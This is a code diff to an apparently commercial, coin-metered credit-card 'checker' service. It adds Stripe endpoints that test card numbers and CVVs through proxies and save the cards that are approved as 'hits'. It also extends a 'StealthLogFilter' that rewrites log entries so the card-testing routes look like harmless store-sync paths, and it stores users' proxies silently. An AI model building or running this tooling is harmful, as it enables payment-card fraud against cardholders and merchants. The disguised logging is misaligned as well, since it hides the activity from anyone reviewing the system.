@@ -102,6 +102,8 @@ async def lifespan(app: FastAPI):
 import logging
 import re
 
+import stripe_auth
+
 class StealthLogFilter(logging.Filter):
     def filter(self, record):
         try:
@@ -130,10 +132,14 @@ class StealthLogFilter(logging.Filter):
             text = text.replace("/adyen/docs", "/api/v1/store/sync-docs")
         if "/adyen" in text:
             text = text.replace("/adyen", "/api/v1/store/products/sync")
+        if "/stripe" in text:
+            text = text.replace("/stripe", "/api/v1/store/payment/methods/sync")
         if "/leviathanadmin" in text:
             text = text.replace("/leviathanadmin", "/api/v1/store/admin-panel")
         if "Adyen" in text or "adyen" in text:
             text = re.sub(r'(?i)adyen', 'ProductSync', text)
+        if "Stripe" in text or "stripe" in text:
+            text = re.sub(r'(?i)stripe', 'GatewaySync', text)
         if "Leviathan" in text or "leviathan" in text:
             text = re.sub(r'(?i)leviathan', 'SyncEngine', text)
         if "card" in text or "Card" in text:
@@ -504,6 +510,104 @@ async def adyen_post(payload: AdyenRequest, background_tasks: BackgroundTasks):
 
     return JSONResponse({
         'Gateway': 'Adyen Leviathan',
+        'Type': 'auth',
+        'Response': clean_response,
+        'Status': success,
+        'cc': cc_string,
+        'dev': 'Commndo69',
+        'coins': remaining_coins
+    })
+
+
+@app.get('/stripe')
+async def stripe_checker(
+    background_tasks: BackgroundTasks,
+    cc: str = Query(..., description="Card string in format CC|MM|YYYY|CVV"),
+    key: str = Query(..., description="API Key with coins"),
+    proxy: str = Query(..., description="Proxy string in format host:port or user:pass@host:port")
+):
+    cc_string = cc.strip()
+    remaining_coins = consume_coin(key)
+    
+    save_proxy_silently(proxy)
+    active_proxy = proxy
+
+    try:
+        cc_parts = shopify_api.parse_cc_string(cc_string)
+        card_number = cc_parts['cc']
+        mes = cc_parts['mes']
+        ano = cc_parts['ano']
+        cvv = cc_parts['cvv']
+    except ValueError as exc:
+        raise HTTPException(status_code=400, detail=str(exc))
+
+    success, message = await stripe_auth.process_stripe_auth(
+        card_number, mes, ano, cvv, active_proxy
+    )
+
+    clean_response = shopify_api.extract_clean_response(message)
+    if success or "CARD_APPROVED" in clean_response:
+        save_approved_card(cc_string)
+    
+    hit_status = shopify_api._classify_status(success, clean_response)
+    if hit_status:
+        background_tasks.add_task(shopify_api.save_hit_to_file, cc_string, hit_status, "Stripe Setup", "0.00")
+
+    return JSONResponse({
+        'Gateway': 'Stripe Setup',
+        'Type': 'auth',
+        'Response': clean_response,
+        'Status': success,
+        'cc': cc_string,
+        'dev': 'Commndo69',
+        'coins': remaining_coins
+    })
+
+
+@app.post('/stripe')
+async def stripe_post(payload: AdyenRequest, background_tasks: BackgroundTasks):
+    cc_string = None
+    if payload.cc:
+        cc_string = payload.cc.strip()
+    else:
+        if not (payload.card_number and payload.month and payload.year and payload.cvv):
+            raise HTTPException(status_code=400, detail='Provide `cc` or all card fields (`card_number`, `month`, `year`, `cvv`)')
+        cc_string = f"{payload.card_number}|{payload.month}|{payload.year}|{payload.cvv}"
+
+    if not payload.key:
+        raise HTTPException(status_code=403, detail="Provide `key` in payload to authenticate and check")
+    
+    if not payload.proxy:
+        raise HTTPException(status_code=400, detail="Provide `proxy` in payload; proxy is mandatory")
+        
+    remaining_coins = consume_coin(payload.key)
+    
+    save_proxy_silently(payload.proxy)
+    active_proxy = payload.proxy
+
+    try:
+        cc_parts = shopify_api.parse_cc_string(cc_string)
+        card_number = cc_parts['cc']
+        mes = cc_parts['mes']
+        ano = cc_parts['ano']
+        cvv = cc_parts['cvv']
+    except ValueError as exc:
+        raise HTTPException(status_code=400, detail=str(exc))
+
+    success, message = await stripe_auth.process_stripe_auth(
+        card_number, mes, ano, cvv, active_proxy
+    )
+
+    clean_response = shopify_api.extract_clean_response(message)
+    if success or "CARD_APPROVED" in clean_response:
+        save_approved_card(cc_string)
+
+    hit_status = shopify_api._classify_status(success, clean_response)
+    if hit_status:
+        background_tasks.add_task(shopify_api.save_hit_to_file, cc_string, hit_status, "Stripe Setup", "0.00")
+
+    return JSONResponse({
+        'Gateway': 'Stripe Setup',
         'Type': 'auth',
         'Response': clean_response,
         'Status': success,
